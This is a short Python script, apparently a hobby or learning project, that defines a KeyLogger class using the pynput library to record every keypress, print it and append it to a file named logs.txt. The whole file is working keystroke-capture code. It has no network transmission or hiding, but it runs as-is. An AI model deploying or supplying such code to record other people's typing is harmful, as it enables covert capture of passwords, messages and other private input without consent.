from pynput import keyboard

class KeyLogger():
    def __init__(self):
        self.filename = "logs.txt"


    def get_char(self, key):
        try:
            return key.char
        except AttributeError:
            return str(key)
            # if key == keyboard.Key.space:
            #     return " "
            # elif key == keyboard.Key.enter:
            #     return "\n"
            # elif key == keyboard.Key.tab:
            #     return "\t"
            # elif key == keyboard.Key.backspace:
            #     return "\b"
            # else:
            #     return ""

    def press(self, key):
        print(key)
        with open(self.filename, "a") as logs:
            logs.write(self.get_char(key) + " ")


    def listener(self):
        listen = keyboard.Listener(on_press=self.press)
        listen.start()

if __name__ == "__main__":
    KeyLogger().listener()
    input()